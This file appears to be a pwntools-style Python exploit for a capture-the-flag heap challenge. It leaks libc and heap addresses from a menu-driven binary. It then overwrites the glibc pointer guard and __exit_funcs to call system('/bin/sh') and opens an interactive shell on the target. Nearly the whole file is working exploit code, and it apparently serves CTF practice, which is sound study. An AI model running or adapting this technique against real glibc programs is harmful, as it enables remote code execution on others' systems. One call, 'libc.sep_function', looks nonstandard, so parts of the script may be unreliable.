#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './bin/chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = './bin/libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_tzname     = libc.symbols['tzname']
ofs_libc_mainarena  = ofs_libc_tzname - 0x8a0
ofs_libc_exit_funcs = 0x219838 # libc.symbols['__exit_funcs']

#==========

def attack(conn, **kwargs):
    mh = MonkeyHeap(conn)

    mh.new(0, 0x518)
    mh.new(3, 0x500)
    mh.new(1, 0x508)
    mh.new(3, 0x500)

    mh.burn(0)
    mh.burn(1)

    addr_libc_mainarena = u(mh.read(0)) - 0x60
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_exit_funcs = libc.address + ofs_libc_exit_funcs
    addr_libc_system     = libc.sep_function['system']
    addr_libc_str_sh     = next(libc.search(b'/bin/sh'))

    addr_tls    = libc.address - 0x28c0
    tcb         = TcbHead(addr_tls)
    info('addr_tls          = 0x{:08x}'.format(addr_tls))

    addr_heap_base      = u(mh.read(1)) - 0x290
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    mh.new(1, 0x508)
    mh.burn(1)
    mh.write(0, flat(addr_libc_mainarena+0x490, addr_libc_mainarena+0x490, addr_heap_base+0x290, tcb.pointer_guard-0x20))
    mh.new(3, 0x528)

    mh.new(1, 0x508)
    mh.burn(1)
    mh.write(0, flat(addr_libc_mainarena+0x490, addr_libc_mainarena+0x490, addr_heap_base+0x290, addr_libc_exit_funcs-0x20))
    mh.new(3, 0x528)

    mh.write(1, flat(4, ptr_mangle(addr_libc_system, addr_heap_base+0x290), addr_libc_str_sh))

    mh.exit()

def ptr_mangle(ptr, guard):
    ptr ^= guard
    return rol(ptr, 8*2+1)

class MonkeyHeap:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.unrecv         = conn.unrecv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new(self, idx, size):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b'size: ', str(size).encode())

    def write(self, idx, data):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b'data: ', data)

    def read(self, idx):
        self.sendlineafter(b'> ', b'3')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.recvuntil(b'papyrus: ')
        data = self.recvuntil(b'> ', drop=True)
        self.unrecv(b'> ')
        return data

    def burn(self, idx):
        self.sendlineafter(b'> ', b'4')
        self.sendlineafter(b'index: ', str(idx).encode())

    def exit(self):
        self.sendlineafter(b'> ', b'0')

class TcbHead:
    def __init__(self, addr):
        self.stack_guard    = addr+0x28
        self.pointer_guard  = addr+0x30

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
